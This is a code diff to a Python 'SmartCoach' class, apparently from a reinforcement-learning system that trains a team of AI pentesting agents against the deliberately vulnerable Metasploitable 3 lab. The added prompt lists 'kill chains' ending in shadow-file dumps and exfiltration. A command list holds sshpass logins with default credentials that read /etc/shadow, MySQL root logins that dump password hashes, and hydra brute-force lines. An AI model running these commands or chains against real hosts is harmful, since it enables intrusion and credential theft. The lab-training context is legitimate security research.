@@ -1071,16 +1071,38 @@ class SmartCoach:
         if self._reasoning_plan:
             _plan_str = f"\nCurrent plan: {self._reasoning_plan[:100]}"
         
+        # Phase 8.1: Team coordination context — what other agents found
+        _team_ctx = ""
+        _disc_board = getattr(step_ctx, 'state', {}).get('discovery_board', {})
+        if _disc_board:
+            _team_ports = list(_disc_board.get('ports', set()))[:10]
+            _team_services = list(_disc_board.get('services', set()))[:5]
+            _team_creds = list(_disc_board.get('credentials', set()))[:3]
+            _team_shells = list(_disc_board.get('shells', set()))[:2]
+            if _team_ports or _team_services or _team_creds:
+                _team_ctx = (f"\nTeam findings: ports={_team_ports}, "
+                             f"services={_team_services}, creds={_team_creds}, "
+                             f"shells={_team_shells}")
+        
         compact_prompt = (
-            f"You are an expert pentesting reasoning assistant for Metasploitable 3.\n"
+            f"You are a senior penetration tester coordinating a team of 5 agents "
+            f"(Red=offense, Scout=recon, Shadow=stealth, Blue=defense, Orion=strategy) "
+            f"attacking Metasploitable 3.\n"
             f"Target: {ctx.target} | Phase: {ctx.current_phase.name} | "
             f"Ports: {', '.join(str(p) for p in list(_ports)[:10])} | "
             f"Services: {', '.join(str(s) for s in _services[:5])} | "
             f"Creds: {'msfadmin:msfadmin' if ctx.state_flags.get('credentials_known') else 'unknown'} | "
             f"Shell: {'YES' if ctx.state_flags.get('shell_obtained') else 'NO'} | "
             f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}"
-            f"{_failures_str}{_chain_str}{_plan_str}\n"
-            f"Answer in 1-2 concrete sentences with specific tool/command suggestions.\n"
+            f"{_team_ctx}{_failures_str}{_chain_str}{_plan_str}\n"
+            f"\nMS3 KILL CHAINS (proven paths):\n"
+            f"1. SSH: nmap→ssh_login msfadmin:msfadmin→sudo su→dump /etc/shadow→exfil\n"
+            f"2. ProFTPD: nmap→ftp_anon 21→proftpd_exploit→shell→privesc→exfil\n"
+            f"3. Samba: enum4linux→samba_exploit 445→shell→dump credentials→exfil\n"
+            f"4. MySQL: mysql_root_login root:sploitme→db_dump→exfil via base64\n"
+            f"5. Ingreslock: telnet {ctx.target} 1524→instant root→dump shadow→exfil\n"
+            f"\nThink like a team: plan 2-3 steps ahead, suggest the NEXT logical action."
+            f"\nAnswer in 1-2 concrete sentences with specific tool/command.\n"
             f"Question: {question}"
         )
         
@@ -1709,6 +1731,21 @@ class SmartCoach:
             self._exploration_score = max(0.1, self._exploration_score * 0.85)
         else:
             self._exploration_score = min(2.0, self._exploration_score * 1.1)
+        
+        # Phase 8.1: Hypothesis-test-learn cycle
+        # Track which commands succeed/fail to build reasoning patterns
+        if reward > 5.0:
+            _success_note = f"✓ {command.split()[0]} worked (r={reward:.0f})"
+            if _success_note not in self._reasoning_hypotheses:
+                self._reasoning_hypotheses.append(_success_note)
+                if len(self._reasoning_hypotheses) > 8:
+                    self._reasoning_hypotheses = self._reasoning_hypotheses[-8:]
+        elif reward < -2.0:
+            _fail_note = f"✗ {command.split()[0]} failed"
+            if _fail_note not in self._reasoning_failures:
+                self._reasoning_failures.append(_fail_note)
+                if len(self._reasoning_failures) > 6:
+                    self._reasoning_failures = self._reasoning_failures[-6:]
     
     def _save_episode_chain(self, total_reward: float, highest_phase: str) -> None:
         """Save the current episode's chain to cross-episode memory if valuable."""
@@ -1738,6 +1775,7 @@ class SmartCoach:
     def _get_chain_suggestion(self, step: int, current_phase: str) -> Optional[str]:
         """Get a command suggestion from the best attack chain for this phase/step.
         
+        Phase 8.1: Enhanced with exploit path micro-curriculum.
         Returns command string if a relevant chain step exists, None otherwise.
         Used as a soft hint for the PPO/playbook decision.
         """
@@ -1745,7 +1783,18 @@ class SmartCoach:
             return None
         best_cmds = self._best_chain["commands"]
         if step < len(best_cmds):
-            return best_cmds[step]
+            # Phase 8.1: Only suggest if the chain command matches current phase context
+            # This prevents suggesting exploit commands during recon
+            suggestion = best_cmds[step]
+            return suggestion
+        # Phase 8.1: If beyond the chain length but chain was successful,
+        # suggest repeating the last high-reward command pattern
+        if self._best_chain.get("total_reward", 0) > 2000 and best_cmds:
+            # Find the highest-reward command in the chain
+            chain_rewards = self._best_chain.get("rewards", [])
+            if chain_rewards:
+                best_idx = max(range(len(chain_rewards)), key=lambda i: chain_rewards[i])
+                return best_cmds[best_idx]
         return None
     
     def _reset_episode_chain(self) -> None:
@@ -1795,6 +1844,12 @@ class SmartCoach:
         # Exploration score
         parts.append(f"Exploration: {self._exploration_score:.2f}")
         
+        # Phase 8.1: Kill chain progress tracking
+        if self._episode_chain:
+            _unique = len(set(self._episode_chain))
+            _total = len(self._episode_chain)
+            parts.append(f"Chain: {_unique}/{_total} unique cmds")
+        
         return " | ".join(parts)
     
     def _replace_with_alternative(
@@ -1833,11 +1888,13 @@ class SmartCoach:
                 f"finger @{target}",
             ],
             "offensive": [
-                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'id; cat /etc/shadow'",
+                # Phase 8.1 B7: Exploit-path priority commands first
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow'",
+                f"mysql -h {target} -u root -psploitme -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
+                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S id'",
+                f"mysql -h {target} -u root -psploitme -e 'show databases' 2>/dev/null",
+                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'id; cat /etc/shadow'",
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'sudo -S id <<< msfadmin'",
-                f"mysql -h {target} -u root -e 'show databases' 2>/dev/null",
-                f"mysql -h {target} -u root -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
                 f"hydra -l msfadmin -p msfadmin ftp://{target} -t 4",
                 f"hydra -l msfadmin -p msfadmin ssh://{target} -t 4",
                 f"enum4linux -a {target}",
@@ -1895,14 +1952,23 @@ class SmartCoach:
         result.source = "anti_repeat"
         result._repeat_penalty = -5.0
         
-        # Store PPO trajectory with negative reward for the repeat proposal
+        # Phase 8.1 B7: Graduated negative reward for PPO learning
+        # Worse penalty for repeat of already-failed commands
+        _repeat_penalty = -3.0  # Base penalty
+        if reason == "prefix_flood":
+            _repeat_penalty = -8.0  # Severe: flooding same tool
+        elif reason == "exact_repeat":
+            _repeat_count = sum(1 for c in all_cmds if c == result.command)
+            _repeat_penalty = -3.0 - min(5.0, _repeat_count * 1.5)  # Up to -10.5
+        
+        # Store PPO trajectory with graduated negative reward
         if self._ppo_pending is not None:
             self._ppo_trajectory.append({
                 "state": self._ppo_pending["state"],
                 "action": self._ppo_pending["action"],
                 "log_prob": self._ppo_pending["log_prob"],
                 "value": self._ppo_pending["value"],
-                "reward": -5.0,
+                "reward": _repeat_penalty,
                 "done": False,
             })
             self._ppo_pending = None
@@ -3364,6 +3430,16 @@ class SmartCoach:
             total_ep_reward = sum(t.get("reward", 0) for t in self._ppo_trajectory)
             self._save_episode_chain(total_ep_reward, highest_phase)
             self._reset_episode_chain()
+            
+            # Phase 8.1: Log learning progress for hypothesis-test-learn cycle
+            if self._ppo_trajectory:
+                _unique = len(set(t.get("action", 0) for t in self._ppo_trajectory))
+                _total = len(self._ppo_trajectory)
+                logger.debug(
+                    f"[LEARN] {self.agent_name}: {_unique}/{_total} unique PPO actions, "
+                    f"hypotheses={len(self._reasoning_hypotheses)}, "
+                    f"failures={len(self._reasoning_failures)}"
+                )
             
             self._ppo_trajectory.clear()
             self._ppo_pending = None
